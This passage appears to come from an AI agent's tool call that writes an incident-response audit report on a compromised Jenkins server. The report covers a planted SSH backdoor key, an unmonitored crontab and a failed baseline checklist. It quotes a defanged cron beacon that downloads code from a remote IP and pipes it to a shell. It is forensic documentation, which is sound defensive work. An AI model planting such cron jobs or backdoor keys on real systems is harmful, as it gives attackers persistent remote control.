Attacker placed a backdoor public key (`ssh-ed25519` / `ssh-rsa`) enabling direct persistent SSH access as user `jenkins`.\n\n### Weakness 4: Unsanitized Cron Job Management\n- **Evidence Path:** `/disk/var/spool/cron/crontabs/jenkins:5`\n- **Configuration Detail:** User `jenkins` or `root` crontabs were not audited by integrity monitoring tools.\n- **Impact:** Attacker injected a 1-minute recurring cron job (`* * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh>`) to re-infect the system continuously.\n\n## 3. Baseline Audit Checklist Summary\n| Check ID | Control / Baseline Item | Result | Target File | Citation |\n|---|---|---|---|---|\n| CHK-06 | Jenkins Security Realm (`useSecurity`) | FAIL | `/var/lib/jenkins/config.xml` | `/disk/var/lib/jenkins/config.xml:3` |\n| BAS-CUSTOM-01 | Groovy Init Directory Integrity | FAIL | `/var/lib/jenkins/init.groovy.d/` | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` |\n| BAS-CUSTOM-02 | User SSH Key Restrictions | FAIL | `/var/lib/jenkins/.ssh/authorized_keys` | `/disk/var/lib/jenkins/.ssh/authorized_keys:2` |\n| CHK-05 | System Crontab Integrity | FAIL | `/var/spool/cron/crontabs/jenkins` | `/disk/var/spool/cron/crontabs/jenkins:5` |\nEOF\n"] min_timeout_sec: 0.5 max_timeout_sec: 180.0
